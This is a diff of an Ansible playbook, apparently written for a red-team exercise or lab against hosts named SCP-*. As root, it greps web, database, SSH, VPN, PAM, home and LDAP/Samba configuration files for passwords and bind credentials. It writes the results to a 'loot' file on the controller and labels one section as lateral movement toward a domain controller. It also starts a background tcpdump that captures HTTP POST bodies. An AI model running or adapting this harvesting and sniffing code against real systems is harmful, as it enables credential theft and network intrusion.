@@ -1,67 +1,75 @@
 ---
-# 1. API KEYS (Looking for cloud/service tokens)
-- name: Extract API Keys
+# SECTION 1: DATABASE & WEB CREDENTIALS (SCP-APACHE-01 & SCP-DATABASE-01)
+- name: Extract Database and Web Credentials
   become: yes
   shell: |
-    grep -rEo "(api_key|token|secret|access_key)\s*[:=]\s*['\"]?[^'\" \t\n;]{8,64}['\"]?" /etc /var/www 2>/dev/null \
-    | grep -vE "(wp-includes|wp-admin|node_modules|undefined|update|unmount)" \
+    # Targets /var/www and mysql configs. 
+    # Excludes wp-includes/wp-admin to stop "regex vomit"
+    grep -rEo "(db_user|db_pass|db_name|db_host|password|passwd)[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /var/www /etc/mysql /etc/apache2 2>/dev/null \
+    | grep -vE "(wp-includes|wp-admin|node_modules|js/|css/|.svg|.png|None)" \
     | sort -u
-  register: api_results
-  failed_when: false
-
-# 2. SYSTEM & AD CREDENTIALS (Looking for local users/AD configs)
-- name: Extract System and AD Credentials
-  become: yes
-  shell: |
-    grep -rEo "(passwd|password|bind_dn|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /etc /home 2>/dev/null \
-    | grep -vE "(\.js|\.css|undefined|passwd: files|passwd: False)" \
-    | sort -u
-  register: ad_results
-  failed_when: false
-
-# 3. DATABASE CREDENTIALS (Specifically targeting config files)
-- name: Extract Database Credentials
-  become: yes
-  shell: |
-    grep -rEo "DB_(PASSWORD|USER|HOST|NAME)['\"],\s*['\"][^'\"]+['\"]" /var/www/html 2>/dev/null \
-    | grep -v "wp-config-sample.php" \
-    | sed "s/['\"],/ = /g" | tr -d "()',\"" | sort -u
   register: db_results
   failed_when: false
+  changed_when: false
 
-# 4. DELIVERY (Organized sections)
-- name: Deliver Organized Loot
+# SECTION 2: SYSTEM & SERVICE CREDENTIALS (SCP-OPENSSH-01 & SCP-OPENVPN-01)
+- name: Extract System and VPN Credentials
+  become: yes
+  shell: |
+    # Scans SSH and VPN configs for cleartext secrets or key paths
+    grep -rEo "(password|passwd|auth_user|secret|key_pass|bind_pw)\s*[:=]\s*['\"]?[^'\" \t\n;]{4,32}['\"]?" /etc/ssh /etc/openvpn /etc/pam.d /home 2>/dev/null \
+    | grep -vE "(\.js|passwd: files|passwd: False|No matches)" \
+    | sort -u
+  register: system_results
+  failed_when: false
+  changed_when: false
+
+# SECTION 3: AD/LDAP BIND INFO (Lateral movement to SCP-DC-01)
+- name: Extract AD and LDAP Bind Info
+  become: yes
+  shell: |
+    # Looks for LDAP bind DNs and passwords used for Windows AD integration
+    grep -rEio "(bind_dn|bind_pw|ad_domain|ad_server)[:=]\s*[^ \t\n;]+" /etc/sssd /etc/ldap /etc/samba 2>/dev/null \
+    | sort -u
+  register: ad_bind_results
+  failed_when: false
+  changed_when: false
+
+# SECTION 4: DELIVERY
+- name: Deliver Organized Service Loot
   delegate_to: localhost
   copy:
     content: |
-      === HARVEST REPORT: {{ inventory_hostname }} ===
+      === SERVICE HARVEST: {{ inventory_hostname }} ===
 
-      [SECTION 1: API KEYS & TOKENS]
-      {{ api_results.stdout if api_results.stdout != "" else "None found" }}
-
-      [SECTION 2: AD & SYSTEM CREDENTIALS]
-      {{ ad_results.stdout if ad_results.stdout != "" else "None found" }}
-
-      [SECTION 3: DATABASE CREDENTIALS]
+      [DATABASE & WEB AUTH]
       {{ db_results.stdout if db_results.stdout != "" else "None found" }}
-    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/organized_loot.txt"
-  become: no
 
-# 5. LIVE ALERT (Categorized for the terminal)
-- name: "CATEGORIZED LOOT ALERT: {{ inventory_hostname }}"
+      [SSH, VPN & SYSTEM SECRETS]
+      {{ system_results.stdout if system_results.stdout != "" else "None found" }}
+
+      [AD/LDAP BIND CONFIGS]
+      {{ ad_bind_results.stdout if ad_bind_results.stdout != "" else "None found" }}
+    dest: "{{ playbook_dir }}/loot/{{ inventory_hostname }}/service_creds.txt"
+  become: no
+  when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""
+
+# SECTION 5: LIVE ALERT
+- name: CATEGORIZED LOOT ALERT
   debug:
     msg:
-      - "--- API KEYS ---"
-      - "{{ api_results.stdout_lines | default(['None']) }}"
-      - "--- AD/SYSTEM ---"
-      - "{{ ad_results.stdout_lines | default(['None']) }}"
-      - "--- DATABASE ---"
+      - "--- DB/WEB (Apache/MySQL) ---"
       - "{{ db_results.stdout_lines | default(['None']) }}"
-  when: api_results.stdout != "" or ad_results.stdout != "" or db_results.stdout != ""
+      - "--- SYSTEM (SSH/VPN) ---"
+      - "{{ system_results.stdout_lines | default(['None']) }}"
+      - "--- AD BIND INFO ---"
+      - "{{ ad_bind_results.stdout_lines | default(['None']) }}"
+  when: db_results.stdout != "" or system_results.stdout != "" or ad_bind_results.stdout != ""
 
 - name: Start Background Network Sniffer
   delegate_to: localhost
   shell: |
+    # Update ens8 if your workstation interface name differs
     nohup tcpdump -i ens8 -A -nn -l 'tcp port 80 and (tcp[((tcp[12:1]) >> 2):4] = 0x504f5354)' > {{ playbook_dir }}/loot/network_sniff.log 2>&1 &
   run_once: true
   become: yes
